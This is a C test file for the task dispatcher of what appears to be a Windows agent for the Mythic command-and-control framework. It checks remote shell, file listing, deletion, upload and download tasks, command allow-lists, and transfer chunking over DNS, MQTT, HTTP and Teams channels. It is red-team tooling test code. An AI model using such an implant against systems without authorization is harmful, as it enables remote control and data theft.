/* Task dispatch tests. Test-only; never linked into the agent.
 *
 * Both builds must exit 0 under wine (the second exercises the
 * build-time command list exclusion path):
 *
 *   zig cc -target x86_64-windows-gnu tasks_test.c tasks.c mythic.c
 *     config.c crypto.c cJSON.c sock.c mqtt.c dns.c http.c teams.c
 *     sysinfo.c -lbcrypt -lwinhttp -lws2_32 -liphlpapi
 *     -o tasks.exe && wine tasks.exe
 *   zig cc -target x86_64-windows-gnu tasks_test.c tasks.c mythic.c
 *     config.c crypto.c cJSON.c sock.c mqtt.c dns.c http.c teams.c
 *     sysinfo.c -DCFG_COMMANDS="shell,exit" -lbcrypt -lwinhttp -lws2_32
 *     -liphlpapi -o tasks_restricted.exe && wine tasks_restricted.exe
 */
#include "common.h"
#include "config.h"
#include "mythic.h"
#include "tasks.h"
#include "cJSON.h"
#include <stdio.h>

static int failures = 0;

#define CHECK(cond, ...) do { \
    if (!(cond)) { \
        printf("FAIL %s:%d: ", __FILE__, __LINE__); \
        printf(__VA_ARGS__); \
        printf("\n"); \
        failures++; \
    } \
} while (0)

static void test_command_in_list(void) {
    CHECK(command_in_list("", "shell") == 1, "empty list allows all");
    CHECK(command_in_list("shell,exit", "shell") == 1, "first");
    CHECK(command_in_list("shell,exit", "exit") == 1, "last");
    CHECK(command_in_list("shell,exit", "ls") == 0, "missing");
    CHECK(command_in_list("shell,exit", "shel") == 0, "prefix must not match");
    CHECK(command_in_list("shell,exit", "shellx") == 0, "superstring must not match");
    CHECK(command_in_list("shell,exit", "hell") == 0, "substring must not match");
    CHECK(command_in_list("shell, exit", "exit") == 1, "spaces tolerated");
}

static void run_task(agent_t *a, const char *command, const char *parameters,
                     response_t *resp, char **output, int *exit_now) {
    task_t t;
    t.command = (char *)command;
    t.parameters = (char *)parameters;
    t.id = "1";
    memset(resp, 0, sizeof(*resp));
    *output = NULL;
    *exit_now = 0;
    CHECK(task_dispatch(a, &t, resp, output, exit_now) == 0, "dispatch %s returns 0", command);
}

static void task_cleanup(response_t *resp, char **output) {
    free(*output);
    *output = NULL;
    free(resp->extra_json);
    resp->extra_json = NULL;
}

static void test_exit_unknown(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    run_task(a, "exit", "", &resp, &output, &exit_now);
    CHECK(exit_now == 1, "exit sets exit_now");
    CHECK(resp.user_output && strcmp(resp.user_output, "exiting") == 0, "exit output");
    task_cleanup(&resp, &output);
    run_task(a, "rm-rf", "", &resp, &output, &exit_now);
    CHECK(exit_now == 0, "unknown sets no exit");
    CHECK(resp.status && strstr(resp.status, "unknown command") != NULL, "unknown status, got %s",
          resp.status ? resp.status : "(null)");
    task_cleanup(&resp, &output);
}

static void test_sleep(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    run_task(a, "sleep", "5 10", &resp, &output, &exit_now);
    if (command_in_list(CFG_COMMANDS, "sleep")) {
        CHECK(a->interval == 5 && a->jitter == 10, "sleep sets %d/%d", a->interval, a->jitter);
    } else {
        CHECK(resp.status && strstr(resp.status, "not included") != NULL, "sleep excluded");
    }
    task_cleanup(&resp, &output);
}

static void test_shell(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    run_task(a, "shell", "echo hi", &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "shell status %s", resp.status);
    CHECK(resp.user_output && strstr(resp.user_output, "hi") != NULL, "shell output");
    task_cleanup(&resp, &output);
}

static void test_ls(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    if (!command_in_list(CFG_COMMANDS, "ls")) {
        run_task(a, "ls", ".", &resp, &output, &exit_now);
        CHECK(resp.status && strstr(resp.status, "not included") != NULL,
              "excluded ls, got %s", resp.status ? resp.status : "(null)");
        task_cleanup(&resp, &output);
        return;
    }
    {
        char tmp[MAX_PATH], dir[MAX_PATH], file[MAX_PATH], params[MAX_PATH + 32];
        HANDLE h;
        DWORD n = GetTempPathA(sizeof(tmp), tmp);
        CHECK(n > 0 && n < sizeof(tmp), "temp path");
        snprintf(dir, sizeof(dir), "%serlikhan-ls-test", tmp);
        CreateDirectoryA(dir, NULL);
        snprintf(file, sizeof(file), "%s\\probe.txt", dir);
        h = CreateFileA(file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        CHECK(h != INVALID_HANDLE_VALUE, "probe file");
        if (h != INVALID_HANDLE_VALUE)
            CloseHandle(h);
        snprintf(params, sizeof(params), "%s", dir);
        run_task(a, "ls", params, &resp, &output, &exit_now);
        CHECK(strcmp(resp.status, "success") == 0, "ls status %s", resp.status);
        CHECK(resp.user_output && strstr(resp.user_output, "probe.txt") != NULL, "ls output");
        task_cleanup(&resp, &output);
        DeleteFileA(file);
        RemoveDirectoryA(dir);
    }
}

static void test_xfer_chunk_size(void) {
    CHECK(xfer_chunk_size("http") == 512000, "http chunk");
    CHECK(xfer_chunk_size("mqtt") == 512000, "mqtt chunk");
    CHECK(xfer_chunk_size("dns") == 8192, "dns chunk");
    CHECK(xfer_chunk_size("msteams") == 8192, "teams chunk");
    CHECK(xfer_chunk_size("") == 512000, "default chunk");
    CHECK(xfer_chunk_size(NULL) == 512000, "null chunk");
}

static void test_post_reply_find(void) {
    cJSON *reply = cJSON_Parse("{\"responses\":[{\"task_id\":\"1\",\"file_id\":\"f\"},{\"task_id\":\"2\",\"status\":\"error\",\"error\":\"no\"}]}");
    cJSON *r;
    CHECK(reply != NULL, "parse reply");
    if (!reply)
        return;
    r = post_reply_find(reply, "2");
    CHECK(r != NULL, "find task 2");
    if (r) {
        CHECK(strcmp(json_str(r, "error"), "no") == 0, "error field");
        CHECK(json_num(r, "total_chunks") == 0, "missing num");
        CHECK(strcmp(json_str(r, "missing"), "") == 0, "missing str");
    }
    CHECK(post_reply_find(reply, "3") == NULL, "miss");
    CHECK(post_reply_find(NULL, "1") == NULL, "null reply");
    cJSON_Delete(reply);
}

static void test_ls_json(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    if (!command_in_list(CFG_COMMANDS, "ls")) {
        run_task(a, "ls", ".", &resp, &output, &exit_now);
        CHECK(resp.extra_json == NULL, "excluded ls has no fragment");
        task_cleanup(&resp, &output);
        return;
    }
    {
        char tmp[MAX_PATH], dir[MAX_PATH], file[MAX_PATH];
        HANDLE h;
        DWORD n = GetTempPathA(sizeof(tmp), tmp), wrote = 0;
        cJSON *wrap, *fb, *files;
        int i, found = 0;
        CHECK(n > 0 && n < sizeof(tmp), "temp path");
        snprintf(dir, sizeof(dir), "%serlikhan-lsjson-test", tmp);
        CreateDirectoryA(dir, NULL);
        snprintf(file, sizeof(file), "%s\\probe.txt", dir);
        h = CreateFileA(file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        CHECK(h != INVALID_HANDLE_VALUE, "probe file");
        if (h != INVALID_HANDLE_VALUE) {
            WriteFile(h, "12345", 5, &wrote, NULL);
            CloseHandle(h);
        }
        run_task(a, "ls", dir, &resp, &output, &exit_now);
        CHECK(strcmp(resp.status, "success") == 0, "ls status %s", resp.status);
        CHECK(resp.extra_json != NULL, "ls fragment present");
        wrap = resp.extra_json ? cJSON_Parse(resp.extra_json) : NULL;
        CHECK(wrap != NULL, "fragment parses");
        fb = wrap ? cJSON_GetObjectItemCaseSensitive(wrap, "file_browser") : NULL;
        CHECK(fb != NULL, "file_browser key");
        if (fb) {
            CHECK(json_str(fb, "name")[0] != '\0', "parent name");
            CHECK(json_str(fb, "parent_path")[0] != '\0', "parent path");
            files = cJSON_GetObjectItemCaseSensitive(fb, "files");
            CHECK(files && cJSON_IsArray(files), "files array");
            if (files) {
                for (i = 0; i < cJSON_GetArraySize(files); i++) {
                    cJSON *c = cJSON_GetArrayItem(files, i);
                    if (strcmp(json_str(c, "name"), "probe.txt") != 0)
                        continue;
                    found = 1;
                    CHECK(cJSON_IsTrue(cJSON_GetObjectItemCaseSensitive(c, "is_file")), "probe is_file");
                    CHECK(json_num(c, "size") == 5, "probe size");
                }
            }
            CHECK(found, "probe listed");
        }
        cJSON_Delete(wrap);
        task_cleanup(&resp, &output);
        DeleteFileA(file);
        RemoveDirectoryA(dir);
    }
}

static void test_rm_mkdir(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    char tmp[MAX_PATH], dir[MAX_PATH], sub[MAX_PATH], file[MAX_PATH];
    HANDLE h;
    DWORD n;
    cJSON *wrap, *arr;
    if (!command_in_list(CFG_COMMANDS, "mkdir") || !command_in_list(CFG_COMMANDS, "rm")) {
        run_task(a, "mkdir", "x", &resp, &output, &exit_now);
        CHECK(resp.extra_json == NULL, "excluded mkdir");
        task_cleanup(&resp, &output);
        run_task(a, "rm", "x", &resp, &output, &exit_now);
        CHECK(resp.extra_json == NULL, "excluded rm");
        task_cleanup(&resp, &output);
        return;
    }
    n = GetTempPathA(sizeof(tmp), tmp);
    CHECK(n > 0 && n < sizeof(tmp), "temp path");
    snprintf(dir, sizeof(dir), "%serlikhan-rm-test", tmp);
    snprintf(sub, sizeof(sub), "%s\\nested", dir);
    run_task(a, "mkdir", sub, &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "mkdir status %s", resp.status);
    CHECK(strstr(resp.user_output, "created") != NULL, "mkdir output");
    task_cleanup(&resp, &output);
    CHECK(GetFileAttributesA(sub) != INVALID_FILE_ATTRIBUTES, "nested dir exists");
    snprintf(file, sizeof(file), "%s\\f.txt", sub);
    h = CreateFileA(file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    CHECK(h != INVALID_HANDLE_VALUE, "probe file");
    if (h != INVALID_HANDLE_VALUE)
        CloseHandle(h);
    run_task(a, "rm", dir, &resp, &output, &exit_now);
    CHECK(strcmp(resp.status, "success") == 0, "rm status %s", resp.status);
    CHECK(resp.extra_json != NULL, "rm fragment");
    wrap = resp.extra_json ? cJSON_Parse(resp.extra_json) : NULL;
    arr = wrap ? cJSON_GetObjectItemCaseSensitive(wrap, "removed_files") : NULL;
    CHECK(arr && cJSON_IsArray(arr) && cJSON_GetArraySize(arr) == 1, "removed_files shape");
    cJSON_Delete(wrap);
    task_cleanup(&resp, &output);
    CHECK(GetFileAttributesA(dir) == INVALID_FILE_ATTRIBUTES, "tree gone");
    run_task(a, "rm", dir, &resp, &output, &exit_now);
    CHECK(resp.status && strstr(resp.status, "error") != NULL, "rm missing errors");
    task_cleanup(&resp, &output);
}

static void test_transfer_errors(agent_t *a) {
    response_t resp;
    char *output = NULL;
    int exit_now = 0;
    char tmp[MAX_PATH], missing[MAX_PATH];
    DWORD n = GetTempPathA(sizeof(tmp), tmp);
    CHECK(n > 0 && n < sizeof(tmp), "temp path");
    snprintf(missing, sizeof(missing), "%sno-such-dir-xyz\\f.bin", tmp);
    run_task(a, "download", missing, &resp, &output, &exit_now);
    if (command_in_list(CFG_COMMANDS, "download"))
        CHECK(resp.status && strstr(resp.status, "cannot open") != NULL, "download missing, got %s",
              resp.status ? resp.status : "(null)");
    else
        CHECK(resp.status && strstr(resp.status, "not included") != NULL, "download excluded");
    task_cleanup(&resp, &output);
    run_task(a, "upload", "{}", &resp, &output, &exit_now);
    if (command_in_list(CFG_COMMANDS, "upload"))
        CHECK(resp.status && strstr(resp.status, "no file id") != NULL, "upload no file, got %s",
              resp.status ? resp.status : "(null)");
    else
        CHECK(resp.status && strstr(resp.status, "not included") != NULL, "upload excluded");
    task_cleanup(&resp, &output);
    run_task(a, "upload", "{\"file\": \"u\"}", &resp, &output, &exit_now);
    if (command_in_list(CFG_COMMANDS, "upload"))
        CHECK(resp.status && strstr(resp.status, "no remote path") != NULL, "upload no path, got %s",
              resp.status ? resp.status : "(null)");
    task_cleanup(&resp, &output);
}

int main(void) {
    agent_t a;
    memset(&a, 0, sizeof(a));
    test_command_in_list();
    test_xfer_chunk_size();
    test_post_reply_find();
    test_exit_unknown(&a);
    test_sleep(&a);
    test_shell(&a);
    test_ls(&a);
    test_ls_json(&a);
    test_rm_mkdir(&a);
    test_transfer_errors(&a);
    if (failures == 0)
        printf("tasks: all pass\n");
    return failures != 0;
}
